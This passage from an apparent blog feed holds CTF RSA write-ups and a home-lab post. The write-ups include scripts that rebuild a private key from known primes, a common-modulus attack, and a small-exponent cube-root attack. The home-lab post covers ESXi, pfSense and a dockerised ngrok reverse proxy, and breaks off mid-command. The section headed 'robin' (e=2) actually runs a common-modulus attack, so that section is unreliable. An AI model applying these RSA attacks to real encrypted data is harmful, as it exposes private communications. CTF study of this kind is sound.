CRT-RSA precomputation</span>        self<span class="token punctuation">.</span>dP <span class="token operator">=</span> self<span class="token punctuation">.</span>d <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>dQ <span class="token operator">=</span> self<span class="token punctuation">.</span>d <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>qInv <span class="token operator">=</span> gmpy<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>self<span class="token punctuation">.</span>q<span class="token punctuation">,</span> self<span class="token punctuation">.</span>p<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">to_pem</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        Return OpenSSL-compatible PEM encoded key        """</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>PEM_TEMPLATE <span class="token operator">%</span> base64<span class="token punctuation">.</span>encodestring<span class="token punctuation">(</span>self<span class="token punctuation">.</span>to_der<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">to_der</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        Return parameters as OpenSSL compatible DER encoded key        """</span>        seq <span class="token operator">=</span> Sequence<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>n<span class="token punctuation">,</span> self<span class="token punctuation">.</span>e<span class="token punctuation">,</span> self<span class="token punctuation">.</span>d<span class="token punctuation">,</span> self<span class="token punctuation">.</span>p<span class="token punctuation">,</span> self<span class="token punctuation">.</span>q<span class="token punctuation">,</span> self<span class="token punctuation">.</span>dP<span class="token punctuation">,</span> self<span class="token punctuation">.</span>dQ<span class="token punctuation">,</span> self<span class="token punctuation">.</span>qInv<span class="token punctuation">]</span><span class="token punctuation">:</span>            seq<span class="token punctuation">.</span>setComponentByPosition<span class="token punctuation">(</span>len<span class="token punctuation">(</span>seq<span class="token punctuation">)</span><span class="token punctuation">,</span> Integer<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> encoder<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>seq<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">dump</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> verbose<span class="token punctuation">)</span><span class="token punctuation">:</span>        vars <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'q'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> verbose<span class="token punctuation">:</span>            vars <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token string">'dP'</span><span class="token punctuation">,</span> <span class="token string">'dQ'</span><span class="token punctuation">,</span> <span class="token string">'qInv'</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> v <span class="token keyword">in</span> vars<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>_dumpvar<span class="token punctuation">(</span>v<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">_dumpvar</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> var<span class="token punctuation">)</span><span class="token punctuation">:</span>        val <span class="token operator">=</span> getattr<span class="token punctuation">(</span>self<span class="token punctuation">,</span> var<span class="token punctuation">)</span>        parts <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">,</span> l<span class="token punctuation">:</span> <span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span>l<span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> l<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> len<span class="token punctuation">(</span>str<span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">40</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%s = %d (%#x)\n'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>var<span class="token punctuation">,</span> val<span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%s ='</span> <span class="token operator">%</span> var<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>parts<span class="token punctuation">(</span><span class="token string">'%x'</span> <span class="token operator">%</span> val<span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    parser <span class="token operator">=</span> optparse<span class="token punctuation">.</span>OptionParser<span class="token punctuation">(</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-p'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'p'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'prime'</span><span class="token punctuation">,</span> type<span class="token operator">=</span><span class="token string">'int'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-q'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'q'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'prime'</span><span class="token punctuation">,</span> type<span class="token operator">=</span><span class="token string">'int'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-n'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'n'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'modulus'</span><span class="token punctuation">,</span> type<span class="token operator">=</span><span class="token string">'int'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-d'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'d'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'private exponent'</span><span class="token punctuation">,</span> type<span class="token operator">=</span><span class="token string">'int'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-e'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'e'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'public exponent (default: %d)'</span> <span class="token operator">%</span> DEFAULT_EXP<span class="token punctuation">,</span> type<span class="token operator">=</span><span class="token string">'int'</span><span class="token punctuation">,</span> default<span class="token operator">=</span>DEFAULT_EXP<span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-o'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'filename'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'output filename'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-f'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'format'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'output format (DER, PEM) (default: PEM)'</span><span class="token punctuation">,</span> type<span class="token operator">=</span><span class="token string">'choice'</span><span class="token punctuation">,</span> choices<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'DER'</span><span class="token punctuation">,</span> <span class="token string">'PEM'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">'PEM'</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-v'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'verbose'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'also display CRT-RSA representation'</span><span class="token punctuation">,</span> action<span class="token operator">=</span><span class="token string">'store_true'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token punctuation">(</span>options<span class="token punctuation">,</span> args<span class="token punctuation">)</span> <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> options<span class="token punctuation">.</span>p <span class="token operator">and</span> options<span class="token punctuation">.</span>q<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Using (p, q) to initialise RSA instance\n'</span><span class="token punctuation">)</span>            rsa <span class="token operator">=</span> RSA<span class="token punctuation">(</span>p<span class="token operator">=</span>options<span class="token punctuation">.</span>p<span class="token punctuation">,</span> q<span class="token operator">=</span>options<span class="token punctuation">.</span>q<span class="token punctuation">,</span> e<span class="token operator">=</span>options<span class="token punctuation">.</span>e<span class="token punctuation">)</span>        <span class="token keyword">elif</span> options<span class="token punctuation">.</span>n <span class="token operator">and</span> options<span class="token punctuation">.</span>d<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Using (n, d) to initialise RSA instance\n'</span><span class="token punctuation">)</span>            rsa <span class="token operator">=</span> RSA<span class="token punctuation">(</span>n<span class="token operator">=</span>options<span class="token punctuation">.</span>n<span class="token punctuation">,</span> d<span class="token operator">=</span>options<span class="token punctuation">.</span>d<span class="token punctuation">,</span> e<span class="token operator">=</span>options<span class="token punctuation">.</span>e<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            parser<span class="token punctuation">.</span>print_help<span class="token punctuation">(</span><span class="token punctuation">)</span>            parser<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">'Either (p, q) or (n, d) needs to be specified'</span><span class="token punctuation">)</span>        rsa<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>options<span class="token punctuation">.</span>verbose<span class="token punctuation">)</span>        <span class="token keyword">if</span> options<span class="token punctuation">.</span>filename<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Saving %s as %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>format<span class="token punctuation">,</span> options<span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> options<span class="token punctuation">.</span>format <span class="token operator">==</span> <span class="token string">'PEM'</span><span class="token punctuation">:</span>                data <span class="token operator">=</span> rsa<span class="token punctuation">.</span>to_pem<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> options<span class="token punctuation">.</span>format <span class="token operator">==</span> <span class="token string">'DER'</span><span class="token punctuation">:</span>                data <span class="token operator">=</span> rsa<span class="token punctuation">.</span>to_der<span class="token punctuation">(</span><span class="token punctuation">)</span>            fp <span class="token operator">=</span> open<span class="token punctuation">(</span>options<span class="token punctuation">.</span>filename<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>            fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>            fp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> optparse<span class="token punctuation">.</span>OptionValueError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        parser<span class="token punctuation">.</span>print_help<span class="token punctuation">(</span><span class="token punctuation">)</span>        parser<span class="token punctuation">.</span>error<span class="token punctuation">(</span>e<span class="token punctuation">.</span>msg<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">python rsatools.py -o private.pem -e 65537 -p 285960468890451637935629440372639283459 -q 304008741604601924494328155975272418463<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="decrypte"><a href="#decrypte" class="headerlink" title="decrypte"></a>decrypte</h2><pre class="line-numbers language-bash"><code class="language-bash">openssl rsautl -decrypt -in flag.enc -inkey private.pem<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="6-robin"><a href="#6-robin" class="headerlink" title="6.robin"></a>6.robin</h1><p>e=2,it change to robin encryption.<br>tips:factor n,and use the python scripts.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> libnum <span class="token keyword">import</span> n2s<span class="token punctuation">,</span>s2n<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> invertn <span class="token operator">=</span> 0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929L<span class="token keyword">def</span> <span class="token function">egcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    g<span class="token punctuation">,</span> y<span class="token punctuation">,</span> x <span class="token operator">=</span> egcd<span class="token punctuation">(</span>b <span class="token operator">%</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>g<span class="token punctuation">,</span> x <span class="token operator">-</span> <span class="token punctuation">(</span>b <span class="token operator">//</span> a<span class="token punctuation">)</span> <span class="token operator">*</span> y<span class="token punctuation">,</span> y<span class="token punctuation">)</span>c1 <span class="token operator">=</span> <span class="token number">463861008715592544541788096958649982380822291993552963661158341083846355706002434243934700644973050350312929747219220890560457890313935777592023703351727593419636777359461171339858607119280562005428366329387881166391098115609145938874628114686795611562877497053809598457912418305834273787716982828673966892511281860557783258533261018387471625613663795007228658816252387085466650755883925526958541825222104147849869543037051564421185564554779540328456839232497404387290624286751566497788567952632360610202764706896626948910002870580127130312643007535939055701346777869816192299596023048076518131526912498284229673371086451392093044296762919642063285989747843447863750040049168164995180248537696839181948713195802142440769355170646676213720809021239439003677117223691298857042248760498034349423407473670451239334072146014950322552189012974940288556937727948167308597745265347385839657632044783493614334001410069910239130566741665106961136354024810810762895951475543242485783800975807492277070656820419568903493214148024889196426647826970230572261314165620636524851460205285978154492707641609544222797219280033396022038053564505730709726626191701076448925166798629160333223816800919504603549706970069896984937227311709903117484219056513</span>c2 <span class="token operator">=</span> <span class="token number">195927128375915404159831782462849519421997168919281192367229155964060692077108973872052067093830637435252224973106403590960932515038799457446882667747435423710065935543543844413331083110324200262663792099201343806708421236272615410153800048782940883675292129942393866266808892179233016046998828763505477208746508926921965388801062981929590402046412505111940482772986190133625714699124188164875578090687811453005795224867122919491454673337692814426115843867664958620407645606387890667138977076727434377908888216522129550500939598401247647451284377783348961677038054513371331912131036588363741320174543932216775500758772806202930724606218837813090150058942140302970078470023234601410850114012056651579503201865188078915561504282163872927300515159998426449361756610452381205386016234990077066797140322333463064165598646284901334076981455665261664866944699135608136052568226611778555151714388687630634120924870097471977570019937467642561549382597187489391364324926276292677979682469604330880184704070172829714637547167378168252389633223108429705879462848460071858533428563787744545008456341542179870964497696809334435217174394915252063444720170993440241479128761827816861630516781632778764274272389367661890340952041792122059256233164391</span>c2 <span class="token operator">=</span> invert<span class="token punctuation">(</span>c2<span class="token punctuation">,</span>n<span class="token punctuation">)</span>e1 <span class="token operator">=</span> <span class="token number">17</span>e2 <span class="token operator">=</span> <span class="token number">65537</span>s <span class="token operator">=</span> egcd<span class="token punctuation">(</span>e1<span class="token punctuation">,</span>e2<span class="token punctuation">)</span>s1 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>s2 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>s2 <span class="token operator">=</span> <span class="token operator">-</span> s2m <span class="token operator">=</span> pow<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> s1<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> pow<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> s2<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token keyword">print</span> n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="7-cube-root"><a href="#7-cube-root" class="headerlink" title="7.cube root"></a>7.cube root</h1><p>if e=3,and n is very big,try it.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> libnum <span class="token keyword">import</span> s2n<span class="token punctuation">,</span>n2s<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> irootn <span class="token operator">=</span> <span class="token number">0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929</span>e <span class="token operator">=</span> <span class="token number">3</span>c <span class="token operator">=</span> <span class="token number">545666236924510340010249577709750283325731706774285241719627277546281629429734726717293022303311450772262647904537263500252284243393598944613964442974546950954108203106726282255676706429218187217515454665602130999856741523362906632677988245886500953095201122016935004088287862399317170828388632964668574391252399791901016522260191839164586088073933168096433230663402492577707149742261018318811473591856287943664733276898405984282679026758294364432874973387827086342720762945025346962005339728347282927842299962927871005260338747371451546554777112213044710533502191671159066680035742327279159127279685106716107705888068319962657817786581813767331740609788885735155741039564703781141646102609725965697004923161084032164730408824475517786576979990372940555488021025837456038491436690372760376483602299268887032528766383572923258228355911069631275397149328319966792315903921085816103476508992023873616148326626245855060470294978538631677232260545724075728912626994884533001056079733734460116442499311813113038763837974777469202302071221647473459505245546281400799833123812072606012604323510933244028733287443734697557314202167934768160824072400916728008549350662843995750077421616789178835625661267955774815287104291379928002318796086248</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> iroot<span class="token punctuation">(</span>c<span class="token operator">+</span>i<span class="token operator">*</span>n<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> res        <span class="token keyword">break</span>    <span class="token keyword">if</span> i<span class="token operator">%</span><span class="token number">10000</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"i="</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    i <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">1</span>m <span class="token operator">=</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>n2s<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rsa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ngrok+esxi+pfsense</title>
      <link href="/2018/05/22/ngrok-esxi-pfsense/"/>
      <url>/2018/05/22/ngrok-esxi-pfsense/</url>
      
        <content type="html"><![CDATA[<p>With a thinking,try to make a cloud environment to do my job,that i can use a chromebook for a whole day work.<br>for this,I try to split a 48h128g server to some small server,like windows,kali,centos…<br>there is some question i met</p><blockquote><p>1.I only have 2 IP,how to make all computer can connected the internat<br>2.The server is in Intranet,how can I connected it,it’s better have a high speed<br>3.How can i keep my safe</p></blockquote><a id="more"></a><p>There is the answer for me to deal it</p><blockquote><p>1.use a Soft router to build a NAT,the two ip ,one give to ESXI server ,other give to router.All server by split from ESXI connect to soft route.In this,I choose pfSense<br>2.this is not a different question.It’s easy to use teamviewer,but i don’t want to use it,for one it’s not stable,it’s usually disconneted for 5 min.other is in sometime,it is very slow.<br>3.All things is make by myself,the server for Reverse proxy server is build in docker.If someone use docker Escape loophole,I recognized.Just del the vps,change it.</p></blockquote><p>Start</p><h1 id="Soft-router"><a href="#Soft-router" class="headerlink" title="Soft router"></a>Soft router</h1><p>There is a lot of router to choose,just like PFsense,Routeros,Sophos,Untangle.<br>I select the pfSense-CE-2.4.0-RELEASE-amd64</p><h2 id="download-the-ova-file"><a href="#download-the-ova-file" class="headerlink" title="download the ova file"></a>download the ova file</h2><p>I use <code>pfSense-CE-2.4.0-RELEASE-amd64.ova</code></p><h2 id="Deploy-it"><a href="#Deploy-it" class="headerlink" title="Deploy it"></a>Deploy it</h2><p>In ESXI,deploy the template.You can change the router Configuration,I make it 4h4g.<br><img src="/img/2018/05/23/soft_router_configuration.png" alt="soft_router_configuration"></p><p>you can set it in shell or in web(you should make a computer connected in the nat)<br><img src="/img/2018/05/23/soft_router_shell_setting.png" alt="soft_router_shell_setting"><br><img src="/img/2018/05/23/soft_router_web_setting.png" alt="soft_router_web_setting"></p><h2 id="setting-DNS-in-computer"><a href="#setting-DNS-in-computer" class="headerlink" title="setting DNS in computer"></a>setting DNS in computer</h2><p>I’m sad,beacuse i can’t solve it,I want to make the DNS in router,but failed.</p><h1 id="Connect"><a href="#Connect" class="headerlink" title="Connect"></a>Connect</h1><p>The way to connected should use Reverse proxy,I use ngork.</p><h2 id="update-and-install-docker"><a href="#update-and-install-docker" class="headerlink" title="update and install docker"></a>update and install docker</h2><pre><code>sudo apt-get updatesudo apt-get upgrade -ysudo apt-get install docker.io</code></pre><p>the other useful command for install docker</p><pre><code>yum install docker-ceyum install docker-iosudo apt-get install docker.ce</code></pre><h2 id="pull-docker-images"><a href="#pull-docker-images" class="headerlink" title="pull docker images"></a>pull docker images</h2><p>I choose <code>docker pull hteen/ngrok</code><br>build it</p><pre><code>docker run --rm -it -e DOMAIN=&quot;&lt; your domain &gt;&quot; -v /data/ngrok:/myfiles hteen/ngrok /bin/sh /build.sh</code></pre><p>if you see <code>build ok !</code>,it’s ok,if error,sometimes may be your vps is not support docker.<br><img src="/img/2018/05/23/ngork_budilok.png" alt="ngork_budilok"></p><h2 id="start-docker-images"><a href="#start-docker-images" class="headerlink" title="start docker images"></a>start docker images</h2><p>if you only want to proxy the http or https.You can just use </p><pre><code>docker run -idt --name ngrok-server -v /data/ngrok:/myfiles -p 80:80 -p 443:443 -p 4443:4443 -e DOMAIN=&#39;&lt; your domain &gt;&#39; hteen/ngrok /bin/sh /server.sh</code></pre><p>if you want to proxy ssh or rdp.You should open more ports.<br>just like</p><pre><code>docker run -idt --name ngrok-server -v /data/ngrok:/myfiles -p 80:80 -p 443:443 -p 4443:4443 -p 50001:50001 -p 50002:50002 -p 50003:50003 -p 50004:50004 -p 50005:50005 -p 50006:50006 -p 50007:50007 -p 50008:50008 -p 50009:50009 -p 50010:50010 -p 50011:50011 -p 50012:50012 -p 50013:50013 -p 50014:50014 -p 50015:50015 -p 50016:50016 -p 50017:50017 -p 50018:50018 -p 50019:50019 -p 50020:50020 -p 50021:50021 -p 50022:50022 -p 50023:50023 -p 50024:50024 -p 50025:50025 -p 50026:50026 -p 50027:50027 -p 50028:50028 -p 50029:50029 -p 50030:50030 -p 50031:50031 -p 50032:50032 -p 50033:50033 -p 50034:50034 -p 50035:50035 -p 50036:50036 -p 50037:50037 -p 50038:50038 -p 50039:50039 -p 50040:50040 -p 50041:50041 -p 50042:50042 -p 50043:50043 -p 50044:50044 -p 50045:50045 -p 50046:50046 -p 50047:50047 -p 50048:50048 -p 50049:50049 -p 50050:50050 -p 50051:50051 -p 50052:50052 -p 50053:50053 -p 50054:50054 -p 50055:50055 -p 50056:50056 -p 50057:50057 -p 50058:50058 -p 50059:50059 -p 50060:50060 -p 50061:50061 -p 50062:50062 -p 50063:50063 -p 50064:50064 -p 50065:50065 -p 50066:50066 -p 50067:50067 -p 50068:50068 -p 50069:50069 -p 50070:50070 -p 50071:50071 -p 50072:50072 -p 50073:50073 -p 50074:50074 -p 50075:50075 -p 50076:50076 -p 50077:50077 -p 50078:50078 -p 50079:50079 -p 50080:50080 -p 50081:50081 -p 50082:50082 -p 50083:50083 -p 50084:50084 -p 50085:50085 -p 50086:50086 -p 